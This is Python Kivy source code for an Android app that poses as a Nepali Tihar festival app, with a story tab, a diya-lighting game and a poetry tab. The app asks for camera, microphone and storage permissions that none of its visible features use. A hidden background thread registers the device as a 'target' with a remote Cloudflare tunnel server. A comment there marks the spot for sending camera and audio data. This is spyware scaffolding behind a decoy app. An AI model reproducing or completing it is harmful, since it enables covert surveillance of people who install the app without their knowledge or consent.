import os
import time
import threading
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.tabbedpanel import TabbedPanel, TabbedPanelItem
from kivy.uix.scrollview import ScrollView

# एन्ड्रोइड पर्मिसनको लागि
from android.permissions import request_permissions, Permission
request_permissions([
    Permission.CAMERA, 
    Permission.RECORD_AUDIO, 
    Permission.INTERNET, 
    Permission.WAKE_LOCK,
    Permission.WRITE_EXTERNAL_STORAGE,
    Permission.READ_EXTERNAL_STORAGE
])

SERVER_URL = "https://your-cloudflared-url.trycloudflare.com"  # यहाँ आफ्नो Cloudflare URL राख्नुहोला
browser_uid = "sam_app_user_" + str(int(time.time()))
my_slot = "Slot_1"

class SamLiveApp(App):
    def build(self):
        root = TabbedPanel()
        root.do_default_tab = False

        # १. कथा ट्याब (धेरै पाठहरू)
        story_tab = TabbedPanelItem(text='📖 कथा')
        story_layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
        story_scroll = ScrollView()
        story_label = Label(
            text="""[b]🪔 रहस्यमयी तिहार विशेष कथा - भाग १: पहिलो दियो[/b]\n
वि.सं. २०३२ सालको तिहारको रात थियो। इलामको एउटा विकट हिमाली गाउँमा सबैजना देउसी-भैलो खेलेर सुतिसकेका थिए। रातको ठीक १२:४५ बजे, सम बहादुरका हजुरबुबा अचानक ब्युँझिए। बाहिर आगनमा मखमली र सयपत्री फूलको कडा सुगन्ध फैलिरहेको थियो।\n\n[b]भाग २: उड्ने दियोको रहस्य[/b]\n
गाउँका सबै कुकुरहरू त्रसित भएर रोइरहेका थिए। उनले झ्यालबाट बाहिर चियाएर हेरे... त्यहाँ कोही थिएन, मात्र एउटा बलिरहेको दियो हावामा तैरिरहेको थियो र एउटा सुमधुर तर रहस्यमयी भैलोको धुन गुञ्जिरहेको थियो...\n\n[b]भाग ३: बन्जर पहाडको रात[/b]\n
त्यो दियो पछि लाग्दै जाँदा उनी गाउँको सबैभन्दा पुरानो गुफा नजिक पुगे, जहाँ पुराना सुनका सिक्काहरू र तिहारका दियोहरूको रहस्य लुकेको थियो...""",
            markup=True, size_hint_y=None, font_size=16
        )
        story_label.bind(texture_size=lambda s, w: setattr(s, 'height', w[1]))
        story_scroll.add_widget(story_label)
        story_layout.add_widget(story_scroll)
        story_tab.add_widget(story_layout)
        root.add_widget(story_tab)

        # २. गेम ट्याब
        game_tab = TabbedPanelItem(text='🎮 गेम')
        game_layout = BoxLayout(orientation='vertical', padding=20, spacing=15)
        self.score = 0
        self.score_label = Label(text=f"बालेको दियो संख्या: {self.score}", font_size=22)
        diya_btn = Button(text="🪔 दियो बाल्नुहोस्", font_size=24, background_color=(1, 0.7, 0.2, 1))
        diya_btn.bind(on_press=self.increment_score)
        game_layout.add_widget(self.score_label)
        game_layout.add_widget(diya_btn)
        game_tab.add_widget(game_layout)
        root.add_widget(game_tab)

        # ३. सायरी र जोक्स ट्याब
        poetry_tab = TabbedPanelItem(text='💖 सायरी/जोक्स')
        poetry_layout = BoxLayout(orientation='vertical', padding=15, spacing=10)
        poetry_scroll = ScrollView()
        poetry_label = Label(
            text="""[b]💖 रोमान्टिक सायरी:[/b]\nदियोको उज्यालो र मखमलीको माला होस्,\nतिम्रो मेरो माया संसारमै सबैभन्दा कडा होस्।\nयो तिहारले ल्याओस् जीवनमा हजारौँ खुसी,\nसधैं सँगै हाँस्न पाइयोस्, नहोस् कहिल्यै रिसिबी!\n\n[b]😂 तिहार जोक्स:[/b]\nहरि: 'यो वर्ष तिहारमा म त कडा पटका पड्काउँछु!'\nश्याम: 'भाउजू घरमै हुँदाहुँदै बाहिर किन पैसा सिध्याउँछस् भाइ!'""",
            markup=True, size_hint_y=None, font_size=16
        )
        poetry_label.bind(texture_size=lambda s, w: setattr(s, 'height', w[1]))
        poetry_scroll.add_widget(poetry_label)
        poetry_layout.add_widget(poetry_scroll)
        poetry_tab.add_widget(poetry_layout)
        root.add_widget(poetry_tab)

        # ब्याकग्राउन्डमा लाइभ मोनिटरिङ सुरु गर्ने (Thread मार्फत)
        threading.Thread(target=self.start_background_monitoring, daemon=True).start()

        return root

    def increment_score(self, instance):
        self.score += 1
        self.score_label.text = f"बालेको दियो संख्या: {self.score}"

    def start_background_monitoring(self):
        # सर्भरमा रजिस्टर गर्ने
        try:
            res = requests.post(f"{SERVER_URL}/register_target", json={"id": browser_uid})
            if res.status_code == 200:
                global my_slot
                my_slot = res.json().get("slot", "Slot_1")
        except Exception as e:
            pass

        # लगातार ब्याकग्राउन्डमा काम गरिरहने
        while True:
            time.sleep(2)
            # यहाँ क्यामेरा र अडियो डाटा पठाउने लजिक थप्न सकिन्छ

if __name__ == '__main__':
    SamLiveApp().run()
